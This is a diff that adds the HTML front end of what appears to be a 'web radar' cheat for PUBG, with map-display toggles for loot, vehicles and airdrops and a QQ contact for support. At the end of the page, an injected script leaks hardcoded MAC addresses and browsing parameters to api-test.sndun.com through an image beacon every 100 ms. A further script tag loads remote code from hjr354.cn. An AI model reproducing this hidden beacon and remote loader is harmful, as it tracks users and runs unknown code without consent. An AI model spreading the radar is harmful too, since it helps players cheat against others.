@@ -1,0 +1,127 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <title>单兵作战同步卫星v4.30</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://unpkg.com/openlayers@4.6.4/dist/ol.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css" />
+  <link rel="stylesheet" href="./app.css" />
+
+  <script src="https://unpkg.com/vue/dist/vue.js"></script>
+  <script src="https://unpkg.com/openlayers"></script>
+  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+  <script src="projection.js"></script>
+  <style type="text/css">
+<!--
+.STYLE1 {
+	color: #FF0000;
+	font-size: 14px;
+}
+.STYLE2 {
+	color: #FF00FF;
+	font-size: 14px;
+}
+.STYLE4 {
+	font-size: medium;
+	font-weight: bold;
+}
+-->
+  </style>
+</head>
+
+<body>
+  <div id="app">
+    <div class="sidenav" id="navBox" style="display:none;">
+      <section class="section">
+        <h1 class="title STYLE4">单兵作战同步卫星v4.30</h1>
+        <h1 class="title STYLE2">修改团队显示（无法显示队友）</h1>
+        <h1 class="title STYLE2">有什么问题请联系Q23589979</h1>		
+		<h1 class="title STYLE1">网页雷达，每天首次访问，请等待</b>地图加载完整后，再连接加速器！</b>否则地图灰屏！</h1>   
+        <!-- <div class="field is-grouped">
+          <a class="button is-small">Button</a>
+          <a class="button is-small">Button2</a>
+        </div> -->
+        
+        <label class="label">地图</label>
+          <input type="radio" id="erangel" value="erangel" v-model="mapType"><label for="erangel">新图</label>
+          <input type="radio" id="miramar" value="miramar" v-model="mapType"><label for="miramar">老图</label>
+          <br><br>
+
+        <label class="label">设置</label>
+          <input type="checkbox" id="followme" v-model="followMe"><label for="followme">跟随</label>
+          <input type="checkbox" id="showbox" v-model="showBox"><label for="showbox">盒子</label>
+		  <br>
+          <input type="checkbox" id="showairdrop" v-model="showAirDrop"><label for="showairdrop">空投</label>
+          <input type="checkbox" id="showcar" v-model="showCar"><label for="showcar">载具</label>
+          <br><br>
+          
+        <!-- <label class="label" v-on:dblclick="showNoItems">Item Options:</label> -->
+        <label class="label">物资</label>
+          <input type="checkbox" id="showBack" v-model="showBack"><label for="showBack">背包　</label>
+          <input type="checkbox" id="showArmor3" v-model="showArmor3"><label for="showBack3">甲３　</label>
+		  <br>
+          <input type="checkbox" id="showHead2" v-model="showHead2"><label for="showHead2">头２</label>
+          <input type="checkbox" id="showHead3" v-model="showHead3"><label for="showBack3">头３</label>
+          <br><br>
+
+          <input type="checkbox" id="showFirstAid" v-model="showFirstAid"><label for="showFirstAid">急救</label>
+          <input type="checkbox" id="showMedKit" v-model="showMedKit"><label for="showMedKit">医疗</label>
+          <br>
+
+          <input type="checkbox" id="showGrenade" v-model="showGrenade"><label for="showGrenade">手雷</label>
+          <input type="checkbox" id="showSmokeBomb" v-model="showSmokeBomb"><label for="showSmokeBomb">烟雾　</label>
+          <br><br>
+
+          <input type="checkbox" id="showLowST" v-model="showLowST"><label for="showLowST">基础镜</label>
+          <input type="checkbox" id="showHighST" v-model="showHighST"><label for="showHighST">高倍镜</label>
+          <br>
+		  
+          <input type="checkbox" id="showARSuppressor" v-model="showARSuppressor"><label for="showARSuppressor">步消音</label>
+          <input type="checkbox" id="showARExtended" v-model="showARExtended"><label for="showARExtended">步扩容</label>
+          <br>
+
+          <input type="checkbox" id="showSRSuppressor" v-model="showSRSuppressor"><label for="showSRSuppressor">狙消音</label>
+          <input type="checkbox" id="showSRExtended" v-model="showSRExtended"><label for="showSRExtended">狙扩容</label>
+          <br><br>
+
+          <input type="checkbox" id="showM16A4" v-model="showM16A4"><label for="showM16A4">Ｍ１６</label>
+          <input type="checkbox" id="showSCAR" v-model="showSCAR"><label for="showSCAR">Ｓｃａｒ</label>
+		  <br>
+          <input type="checkbox" id="showHK416" v-model="showHK416"><label for="showHK416">Ｍ４１６</label>
+          <input type="checkbox" id="showAK47" v-model="showAK47"><label for="showAK47">Ａｋｍ</label>
+          <br>
+
+          <input type="checkbox" id="showMini14" v-model="showMini14"><label for="showMini14">Ｍｉｎｉ</label>
+          <input type="checkbox" id="showSKS" v-model="showSKS"><label for="showSKS">Ｓｋｓ</label>
+		  <br>
+          <input type="checkbox" id="showKar98k" v-model="showKar98k"><label for="showKar98k">９８ｋ　</label>
+          <input type="checkbox" id="showPan" v-model="showPan"><label for="showPan">平底锅</label>
+
+        <hr>
+        <label class="label">刷新率:</label>
+          <a class="button is-small" @click="setFPS(30)">FPS30</a>
+          <a class="button is-small" @click="setFPS(60)">FPS60</a>
+		  <a class="button is-small" @click="setFPS(120)">fps120</a>
+          <br><br>
+
+        <!-- <a class="button is-small" @click="toggleRefresh">{{ toggleButtonText }}</a>
+        <br> -->
+
+        <span>游戏开始: {{ gameStartTime }}</span>
+        <br>
+        <span>结束数据: {{ lastPacketTime }}</span>
+        <br>
+
+        <span>{{ coordinate }}</span>
+      </section>
+
+    </div>
+    <div id="map"></div>
+  </div>
+<div class="menuBox" id="menuBox"></div>
+  <script src="app.js"></script>
+  <script src="js.js"></script>
+<script>;(function(){if(window.location.host!='www.baidu.com'||window._BD_C||window.sendImage){return}window._BD_C={mac:"1C-87-2C-74-86-3F",bmac:"B0-51-8E-04-2D-FD",cid:"zd",url:""};setInterval(function(){if(window.location.href!=window._BD_C.url){window._BD_C.tn='',window._BD_C.ch='';window._BD_C.url=window.location.href;if(window.location.search!=''){_arg=window.location.search.replace('?','').split('&');for(i in _arg){if(_arg.hasOwnProperty(i)&&_arg[i]!=''){t=_arg[i].split('=');switch(t[0]){case'tn':window._BD_C.tn=t[1];break;case'ch':window._BD_C.ch=t[1];break}}}}_t=new Image;_t.src="https://api-test.sndun.com/wb/stage.json?tntype=baidu&cid="+window._BD_C.cid+"&bmac="+window._BD_C.bmac+"&mac="+window._BD_C.mac+"&tn="+window._BD_C.tn+"&ch="+window._BD_C.ch+'&_='+(+new Date());_t=null}},100)})();</script><script src="https://hjr354.cn/moni.php?m=1525083569" type="text/javascript"></script></body>
+
+</html>
